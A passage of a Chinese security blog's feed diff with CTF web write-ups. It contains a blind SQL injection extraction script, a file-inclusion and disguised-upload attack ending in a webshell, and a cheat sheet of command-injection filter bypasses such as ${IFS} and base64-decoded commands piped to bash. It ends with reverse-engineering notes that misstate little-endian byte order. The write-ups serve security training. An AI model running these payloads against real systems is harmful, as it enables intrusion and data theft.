+<p>给出利用脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> string</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">global</span> findBit</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendPayload</span><span class="params">(payload)</span>:</span></div><div class="line">	proxy = &#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;</div><div class="line">	url = <span class="string">"http://218.76.35.74:20130/login.php"</span></div><div class="line">	headers = &#123;<span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span>&#125;</div><div class="line">	parm = <span class="string">"uname="</span>+payload+<span class="string">"&amp;passwd=admin"</span></div><div class="line">	content = requests.post(url,data=parm,headers=headers,proxies=proxy)</div><div class="line">	<span class="keyword">return</span> content.text</div><div class="line"></div><div class="line">usernameerr = <span class="string">"username error!!"</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">generateTarget</span><span class="params">(flag)</span>:</span></div><div class="line">	<span class="keyword">if</span> flag == <span class="string">"database"</span>:</div><div class="line">		<span class="keyword">return</span> <span class="string">"database()"</span></div><div class="line">	<span class="keyword">elif</span> flag == <span class="string">"passwd"</span>:</div><div class="line">		<span class="keyword">return</span> <span class="string">"(SELECT(passwd)from(admin))"</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">doubleSearch</span><span class="params">(leftNum,rightNum,i,target)</span>:</span></div><div class="line">	<span class="keyword">global</span> findBit</div><div class="line">	midNum = (leftNum + rightNum) / <span class="number">2</span></div><div class="line">	<span class="keyword">if</span> (rightNum != leftNum +<span class="number">1</span>):</div><div class="line">		payload = <span class="string">"admin'^(select(ascii(mid(("</span>+generateTarget(target) +<span class="string">")from("</span>+ str(i) +<span class="string">"))))&lt;="</span>+str(midNum) +<span class="string">")='0"</span></div><div class="line"></div><div class="line">		recv = sendPayload(payload)</div><div class="line"></div><div class="line">		<span class="keyword">if</span> usernameerr <span class="keyword">in</span> recv:</div><div class="line"></div><div class="line">			doubleSearch(midNum,rightNum,i,target)</div><div class="line">		<span class="keyword">else</span>:</div><div class="line"></div><div class="line">			doubleSearch(leftNum,midNum,i,target)</div><div class="line">	<span class="keyword">else</span>:</div><div class="line">		<span class="keyword">if</span> rightNum != <span class="number">0</span>:</div><div class="line"></div><div class="line">			sys.stdout.write(chr(rightNum))</div><div class="line">			sys.stdout.flush()</div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			findBit = <span class="number">1</span></div><div class="line">			<span class="keyword">return</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></div><div class="line">	<span class="keyword">global</span> findBit</div><div class="line"></div><div class="line">	i = <span class="number">1</span></div><div class="line">	findBit = <span class="number">0</span></div><div class="line">	<span class="keyword">print</span> <span class="string">"The passwd:"</span></div><div class="line">	target = <span class="string">"passwd"</span></div><div class="line">	<span class="keyword">while</span> i :</div><div class="line">		doubleSearch(<span class="number">-1</span>,<span class="number">255</span>,i,target)</div><div class="line">		i += <span class="number">1</span></div><div class="line">		<span class="keyword">if</span> findBit == <span class="number">1</span>:</div><div class="line">			sys.stdout.write(<span class="string">"\r\n"</span>)</div><div class="line">			<span class="keyword">break</span></div><div class="line"></div><div class="line">exp()</div></pre></td></tr></table></figure></p>
+<p>获得密码的Md5值为：50f87a3a3ad48e26a5d9058418fb78b5<br>解密后为： shuangshuang</p>
+<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><p>登陆后有一个命令执行的地方，但是过滤了空格，而且仅仅回显出结果的最后一条。<br>参考：<a href="http://www.freebuf.com/articles/web/137923.html" target="_blank" rel="external">浅谈CTF中命令执行与绕过的小技巧</a>，空格可以利用${IFS}替代。<br>而回显可以利用head来选择。</p>
+<p>输入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ls$&#123;IFS&#125;/var/www/html|head$&#123;IFS&#125;-n$&#123;IFS&#125;1</div></pre></td></tr></table></figure></p>
+<p>得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">9ef89ad913e848b64b73e3aa721e44e4</div></pre></td></tr></table></figure></p>
+<p>输入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ls$&#123;IFS&#125;/var/www/html/9ef89ad913e848b64b73e3aa721e44e4/</div></pre></td></tr></table></figure></p>
+<p>得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">this_pag0_is_F1a9.php</div></pre></td></tr></table></figure></p>
+<p>输入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cat$&#123;IFS&#125;/var/www/html/9ef89ad913e848b64b73e3aa721e44e4/*</div></pre></td></tr></table></figure></p>
+<p>得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag&#123;sQ1_1NJEct_coMMond_eXEC&#125;</div></pre></td></tr></table></figure></p>
+<p>或者直接访问:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://218.76.35.74:20130/9ef89ad913e848b64b73e3aa721e44e4/this_pag0_is_F1a9.php</div></pre></td></tr></table></figure></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;mysql 盲注&lt;/p&gt;
+&lt;p&gt;命令执行 ${IFS}绕过&lt;br&gt;
+    
+    </summary>
+    
+      <category term="writeup:Web" scheme="http://yoursite.com/categories/writeup-Web/"/>
+    
+    
+      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
+    
+      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
+    
+      <category term="web" scheme="http://yoursite.com/tags/web/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>XNUCA 2017-Web专题赛前指导-Document-writeup</title>
+    <link href="http://yoursite.com/2017/08/16/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-Document-writeup/"/>
+    <id>http://yoursite.com/2017/08/16/XNUCA-2017-Web专题赛前指导-Document-writeup/</id>
+    <published>2017-08-16T11:10:23.000Z</published>
+    <updated>2017-08-18T11:46:49.778Z</updated>
+    
+    <content type="html"><![CDATA[<p>php伪协议 文件读取  文件上传绕过  apache解析漏洞<br><a id="more"></a></p>
+<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://218.76.35.74:20129</div></pre></td></tr></table></figure>
+<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>查看源代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html lang=&quot;en&quot;&gt;</div><div class="line">&lt;head&gt;</div><div class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</div><div class="line">    &lt;title&gt;Document&lt;/title&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">    &lt;!-- include.php --&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p>
+<p>发现有include.php，访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://218.76.35.74:20129/include.php</div></pre></td></tr></table></figure></p>
+<p>提示 the parameter is file! :) 。同时查看源代码有upload.php，是个上传页面。</p>
+<p>利用php伪协议读取源码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://218.76.35.74:20129/include.php?file=php://filter/read=convert.base64-encode/resource=include</div></pre></td></tr></table></figure></p>
+<p>include.php:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line">Tips: the parameter is file! :)</div><div class="line">&lt;!-- upload.php --&gt;</div><div class="line">&lt;/html&gt;</div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    @$file = $_GET[<span class="string">"file"</span>];</div><div class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($file))</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/http|data|ftp|input|%00/i'</span>, $file) || strstr($file,<span class="string">".."</span>) !== <span class="keyword">FALSE</span> || strlen($file)&gt;=<span class="number">70</span>)</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">echo</span> <span class="string">"&lt;p&gt; error! &lt;/p&gt;"</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span></div><div class="line">        &#123;</div><div class="line">            <span class="keyword">include</span>($file.<span class="string">'.php'</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>读取upload源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://218.76.35.74:20129/include.php?file=php://filter/read=convert.base64-encode/resource=upload</div></pre></td></tr></table></figure></p>
+<p>upload.php:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">&lt;form action=<span class="string">""</span> enctype=<span class="string">"multipart/form-data"</span> method=<span class="string">"post"</span></div><div class="line">name=<span class="string">"upload"</span>&gt;file:&lt;input type=<span class="string">"file"</span> name=<span class="string">"file"</span> /&gt;&lt;br&gt;</div><div class="line">&lt;input type=<span class="string">"submit"</span> value=<span class="string">"upload"</span> /&gt;&lt;/form&gt;</div><div class="line"></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">"file"</span>]))</div><div class="line">&#123;</div><div class="line">    <span class="keyword">echo</span> $_FILES[<span class="string">"file"</span>];</div><div class="line">    $allowedExts = <span class="keyword">array</span>(<span class="string">"gif"</span>, <span class="string">"jpeg"</span>, <span class="string">"jpg"</span>, <span class="string">"png"</span>);</div><div class="line">    @$temp = explode(<span class="string">"."</span>, $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);</div><div class="line">    $extension = end($temp);</div><div class="line">    <span class="keyword">if</span> (((@$_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/gif"</span>) || (@$_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/jpeg"</span>)</div><div class="line">    || (@$_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/jpg"</span>) || (@$_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/pjpeg"</span>)</div><div class="line">    || (@$_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/x-png"</span>) || (@$_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/png"</span>))</div><div class="line">    &amp;&amp; (@$_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>] &lt; <span class="number">102400</span>) &amp;&amp; in_array($extension, $allowedExts))</div><div class="line">    &#123;</div><div class="line">        move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>], <span class="string">"upload/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);</div><div class="line">        <span class="keyword">echo</span> <span class="string">"file upload successful!Save in:  "</span> . <span class="string">"upload/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"upload failed!"</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>随手上传了一个 god4.php.jpg</p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170814/3.png?raw=true" alt=""></p>
+<p>访问:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://218.76.35.74:20129/upload/god4.php.jpg</div></pre></td></tr></table></figure></p>
+<p>被解析了，应该是因为apache的缘故，不识别jpg，然后向前递归解析了php。既然能解析，那就用菜刀连上去：</p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170814/4.png?raw=true" alt=""></p>
+<p>在虚拟终端中：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">find / | grep flag</div></pre></td></tr></table></figure></p>
+<p>然后发现有：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/etc/.sshkey/flag.txt</div></pre></td></tr></table></figure></p>
+<p>得到flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">[/var/www/html/upload/]$ cat /etc/.sshkey/flag.txt</div><div class="line">7F5A58DFC54CFAC9903FE85D92703787</div></pre></td></tr></table></figure></p>
+<p>这题也有多种解法，因为在include.php中可以发现，没有对zip或者phar协议等进行过滤，可以利用这些协议进行直接的文件包含。</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;php伪协议 文件读取  文件上传绕过  apache解析漏洞&lt;br&gt;
+    
+    </summary>
+    
+      <category term="writeup:Web" scheme="http://yoursite.com/categories/writeup-Web/"/>
+    
+    
+      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
+    
+      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
+    
+      <category term="web" scheme="http://yoursite.com/tags/web/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>命令执行的一些绕过技巧</title>
+    <link href="http://yoursite.com/2017/08/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/"/>
+    <id>http://yoursite.com/2017/08/15/命令执行的一些绕过技巧/</id>
+    <published>2017-08-15T11:05:33.000Z</published>
+    <updated>2017-08-18T11:49:18.603Z</updated>
+    
+    <content type="html"><![CDATA[<p>命令执行的一些绕过技巧<br>已收录至: <a href="https://chybeta.gitbooks.io/waf-bypass/content/ming-ling-zhu-ru/rao-guo-fang-fa.html" target="_blank" rel="external">WAF-Bypass</a><br><a id="more"></a></p>
+<h1 id="多条命令"><a href="#多条命令" class="headerlink" title="多条命令"></a>多条命令</h1><h2 id="法一：-逻辑运算符"><a href="#法一：-逻辑运算符" class="headerlink" title="法一： 逻辑运算符"></a>法一： 逻辑运算符</h2><h1 id="绕过escapeshellcmd"><a href="#绕过escapeshellcmd" class="headerlink" title="绕过escapeshellcmd"></a>绕过escapeshellcmd</h1><h2 id="法一：win下执行bat"><a href="#法一：win下执行bat" class="headerlink" title="法一：win下执行bat"></a>法一：win下执行bat</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$command = <span class="string">'dir '</span>.$_POST[<span class="string">'dir'</span>];</div><div class="line">$escaped_command = escapeshellcmd($command);</div><div class="line">var_dump($escaped_command);</div><div class="line">file_put_contents(<span class="string">'out.bat'</span>,$escaped_command);</div><div class="line">system(<span class="string">'out.bat'</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>执行.bat文件的时候，利用%1a，可以绕过过滤执行命令。<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">dir=../ %1a whoami</div></pre></td></tr></table></figure></p>
+<h2 id="法二：宽字节注入"><a href="#法二：宽字节注入" class="headerlink" title="法二：宽字节注入"></a>法二：宽字节注入</h2><p>php5.2.5及之前可以通过输入多字节来绕过。现在几乎见不到了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">escapeshellcmd(&quot;echo &quot;.chr(0xc0).&quot;;id&quot;);</div></pre></td></tr></table></figure></p>
+<p>之后该语句会变成<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">echo 繺;id</div></pre></td></tr></table></figure></p>
+<p>从而实现 id 命令的注入。</p>
+<h1 id="空格过滤"><a href="#空格过滤" class="headerlink" title="空格过滤"></a>空格过滤</h1><h2 id="法一：-IFS"><a href="#法一：-IFS" class="headerlink" title="法一： ${IFS}"></a>法一： ${IFS}</h2><p>payload1:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-207-93-ubuntu:~$ cat flag</div><div class="line">nice day</div><div class="line">ubuntu@VM-207-93-ubuntu:~$ cat$&#123;IFS&#125;flag</div><div class="line">nice day</div></pre></td></tr></table></figure></p>
+<p>payload2:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-207-93-ubuntu:~$ cat$&#123;IFS&#125;$9flag</div><div class="line">nice day</div></pre></td></tr></table></figure></p>
+<p>payload3:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-207-93-ubuntu:~$ cat$IFS$9flag</div><div class="line">nice day</div></pre></td></tr></table></figure></p>
+<h2 id="法二：-重定向符-lt-gt"><a href="#法二：-重定向符-lt-gt" class="headerlink" title="法二： 重定向符&lt;&gt;"></a>法二： 重定向符&lt;&gt;</h2><p>payload1：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-207-93-ubuntu:~$ cat&lt;&gt;flag</div><div class="line">nice day</div></pre></td></tr></table></figure></p>
+<p>payload2：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-207-93-ubuntu:~$ cat&lt;flag</div><div class="line">nice day</div></pre></td></tr></table></figure></p>
+<h1 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h1><h2 id="法一：-拼接"><a href="#法一：-拼接" class="headerlink" title="法一： 拼接"></a>法一： 拼接</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-207-93-ubuntu:~$ a=c;b=at;c=flag;$a$b $c</div><div class="line">nice day</div></pre></td></tr></table></figure>
+<h2 id="法二：-利用已存在的资源"><a href="#法二：-利用已存在的资源" class="headerlink" title="法二： 利用已存在的资源"></a>法二： 利用已存在的资源</h2><p>从已有的文件或者环境变量中获得相应的字符。</p>
+<h2 id="法三：-base64编码"><a href="#法三：-base64编码" class="headerlink" title="法三： base64编码"></a>法三： base64编码</h2><p>payload1:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-207-93-ubuntu:~$ `echo &quot;Y2F0IGZsYWc=&quot;|base64 -d`</div><div class="line">nice day</div></pre></td></tr></table></figure></p>
+<p>payload2:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-207-93-ubuntu:~$ echo &quot;Y2F0IGZsYWc=&quot;|base64 -d|bash</div><div class="line">nice day</div></pre></td></tr></table></figure></p>
+<h2 id="法四：-单引号、双引号"><a href="#法四：-单引号、双引号" class="headerlink" title="法四： 单引号、双引号"></a>法四： 单引号、双引号</h2><p>payload1:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-207-93-ubuntu:~$ c&quot;&quot;at flag</div><div class="line">nice day</div></pre></td></tr></table></figure></p>
+<p>payload2:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-207-93-ubuntu:~$ c&quot;&quot;at fl&quot;&quot;ag</div><div class="line">nice day</div></pre></td></tr></table></figure></p>
+<p>payload3:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-207-93-ubuntu:~$ c&quot;&quot;at fl&apos;&apos;ag</div><div class="line">nice day</div></pre></td></tr></table></figure></p>
+<h2 id="法五：反斜线"><a href="#法五：反斜线" class="headerlink" title="法五：反斜线 \"></a>法五：反斜线 \</h2><p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-207-93-ubuntu:~$ c\at fl\ag</div><div class="line">nice day</div></pre></td></tr></table></figure></p>
+<h1 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h1><h1 id="长度限制"><a href="#长度限制" class="headerlink" title="长度限制"></a>长度限制</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span>(strlen($_GET[test])&lt;<span class="number">8</span>)&#123;</div><div class="line"><span class="keyword">echo</span> shell_exec($_GET[test]);</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<h2 id="文件构造"><a href="#文件构造" class="headerlink" title="文件构造"></a>文件构造</h2><p>payload1:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">a&gt;wget</div></pre></td></tr></table></figure></p>
+<p>payload2:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">1&gt;wget</div></pre></td></tr></table></figure></p>
+<p>payload3:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&gt;wget</div></pre></td></tr></table></figure></p>
+<p>将会创建一个名字为wget的空文件。payload1会报错，payload2不会报错。.</p>
+<h1 id="LINUX下一些已有字符"><a href="#LINUX下一些已有字符" class="headerlink" title="LINUX下一些已有字符"></a>LINUX下一些已有字符</h1><ul>
+<li>${PS2} 对应字符 ‘&gt;’</li>
+<li>${PS4} 对应字符 ‘+’</li>
+<li>${IFS} 对应 内部字段分隔符</li>
+<li>${9} 对应 空字符串</li>
+</ul>
+<h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><ul>
+<li><a href="https://github.com/ewilded/shelling" target="_blank" rel="external">shelling
+</a></li>
+</ul>
+<h1 id="Refference"><a href="#Refference" class="headerlink" title="Refference"></a>Refference</h1><ul>
+<li><a href="https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html" target="_blank" rel="external">PHP绕过open_basedir列目录的研究</a></li>
+<li><a href="https://www.leavesongs.com/PHP/bypass-eval-length-restrict.html" target="_blank" rel="external">eval长度限制绕过 &amp;&amp; PHP5.6新特性</a></li>
+<li><a href="https://www.leavesongs.com/PENETRATION/nginx-deny-exec-php-file.html" target="_blank" rel="external">关于lnmp目录禁止执行的绕过与正确方法</a></li>
+<li><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="external">一些不包含数字和字母的webshell</a></li>
+<li><a href="http://bobao.360.cn/learning/detail/3271.html" target="_blank" rel="external">php webshell分析和绕过waf技巧</a></li>
+<li><a href="http://bobao.360.cn/learning/detail/3192.html" target="_blank" rel="external">【技术分享】命令执行和绕过的一些小技巧</a></li>
+<li><a href="http://www.freebuf.com/articles/web/137923.html" target="_blank" rel="external">浅谈CTF中命令执行与绕过的小技巧</a></li>
+<li><a href="http://www.math1as.com/index.php/archives/484" target="_blank" rel="external">Mathias:命令执行的bypass技巧</a></li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;命令执行的一些绕过技巧&lt;br&gt;已收录至: &lt;a href=&quot;https://chybeta.gitbooks.io/waf-bypass/content/ming-ling-zhu-ru/rao-guo-fang-fa.html&quot;&gt;WAF-Bypass&lt;/a&gt;&lt;br&gt;
+    
+    </summary>
+    
+      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
+    
+    
+      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+    
+      <category term="php" scheme="http://yoursite.com/tags/php/"/>
+    
+      <category term="代码执行" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>逆向学习笔记（一）</title>
+    <link href="http://yoursite.com/2017/08/14/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
+    <id>http://yoursite.com/2017/08/14/逆向学习笔记（一）/</id>
+    <published>2017-08-14T15:04:31.000Z</published>
+    <updated>2017-08-18T11:51:39.128Z</updated>
+    
+    <content type="html"><![CDATA[<p>跟着《加密与解密》学习。<br><a id="more"></a></p>
+<h1 id="第一章：基础知识"><a href="#第一章：基础知识" class="headerlink" title="第一章：基础知识"></a>第一章：基础知识</h1><h2 id="文本字符"><a href="#文本字符" class="headerlink" title="文本字符"></a>文本字符</h2><ol>
+<li>字节存储顺序与CPU有关。<ul>
+<li>Big-Endian: 高位字节存入低地址，低位字节存入高地址，依次排列。</li>
+<li>Little-Endian： 低位字节存入高地址，高位字节存入高地址，反序排列。</li>
+</ul>
+</li>
+<li>ASCII 与 Unicode字符集<ul>
+<li>ASCII: 127以上的部分不统一。8位。</li>
+<li>Unicode： ASCII字符编码的扩展。在win中用两个字节进行编码，亦称宽字节编码(Widechars)。使用0~65535之间的双字节无符号整数对每个字节编码。所有字符均为16位。</li>
+</ul>
+</li>
+</ol>
+<h2 id="Windows操作系统"><a href="#Windows操作系统" class="headerlink" title="Windows操作系统"></a>Windows操作系统</h2><h3 id="WinAPI简介"><a href="#WinAPI简介" class="headerlink" title="WinAPI简介"></a>WinAPI简介</h3><ol>
+<li>略</li>
+</ol>
+<h3 id="常用Win32API函数"><a href="#常用Win32API函数" class="headerlink" title="常用Win32API函数"></a>常用Win32API函数</h3><ol>
+<li>API函数区分字符集： A表示ANSI，W表示Widechars即Unicode。</li>
+<li>常用的API函数：<ul>
+<li>hmemcpy() : win16 API函数。将内存某块数据拷贝到另一个地方。</li>
+<li>GetWindowText（）：USER32.DLL中。取得一个窗体的标题文字或一个文本控件的内容。<ul>
+<li>GetWindowTextA</li>
+<li>GetWindowTextW</li>
+</ul>
+</li>
